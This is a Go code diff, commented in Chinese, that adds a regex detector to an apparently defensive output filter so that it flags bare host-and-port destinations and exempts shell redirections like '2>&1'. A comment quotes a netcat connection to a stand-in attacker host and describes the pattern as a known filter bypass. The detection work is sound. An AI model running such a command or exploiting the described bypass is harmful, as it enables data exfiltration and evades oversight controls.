@@ -66,6 +66,21 @@ var egressHostFromPort = regexp.MustCompile(`(?i)\b([a-z0-9](?:[a-z0-9\-]*[a-z0-
 // 自己覆盖的形态必须自己认。
 var egressHostFromUserInfo = regexp.MustCompile(`(?i)\b[a-z0-9._%+\-]+@([a-z0-9](?:[a-z0-9\-]*[a-z0-9])?(?:\.[a-z0-9\-]+)*)`)
 
+// egressHostFromBarePort 抓取「裸主机 空格 端口」形态：nc attacker.io 4444。
+//
+// 这是 r1016 留下的最后一个已知绕过，但它是**最难干净收口**的一个形态：
+// `cat error.log 2>&1`、`grep -n x a.txt 2>/dev/null`、`python x.py 1>&2`
+// 里的「带点 token 紧跟数字」是 shell 里极其常见的写法（文件 + 重定向级别），
+// 照单全收会把一次 cat 变成整条响应 output_policy_blocked。
+//
+// 因此端口右侧紧跟重定向/管道字符时不算端口——RE2 没有零宽断言（lookahead），
+// 所以右侧字符在代码里判（barePortFollower）。判的是「这个数字是不是端口」，
+// 不是「哪些 token 可以出现」，所以方向仍然是默认阻断，不需要维护白名单。
+var egressHostFromBarePort = regexp.MustCompile(`(?i)\b([a-z0-9](?:[a-z0-9\-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?)+)\s+(\d{1,5})`)
+
+// barePortFollower 是「紧跟在候选端口后面」的字符集合。命中即判定该数字不是端口。
+const barePortFollower = "0123456789>&|/\\"
+
 // nonPublicHostSuffixes 是**明确不可路由**的主机后缀。
 //
 // 判据与 IP 侧的 isNonExfiltrationAddress 同源：只列「在公网 DNS 上不存在」的
@@ -146,6 +161,20 @@ func hasPublicHostDestination(text string) bool {
 	}
 	for _, m := range egressHostFromUserInfo.FindAllStringSubmatch(text, -1) {
 		if !isNonExfiltrationDestinationHost(m[1]) {
+			return true
+		}
+	}
+	for _, loc := range egressHostFromBarePort.FindAllStringSubmatchIndex(text, -1) {
+		// m[2],m[3] 是主机；m[4],m[5] 是候选端口。
+		portEnd := loc[5]
+		if portEnd < 0 {
+			continue
+		}
+		if portEnd < len(text) && strings.IndexByte(barePortFollower, text[portEnd]) >= 0 {
+			// 紧跟重定向/管道/数字，例如 `cat error.log 2>&1` 里的 2 不是端口。
+			continue
+		}
+		if !isNonExfiltrationDestinationHost(text[loc[2]:loc[3]]) {
 			return true
 		}
 	}
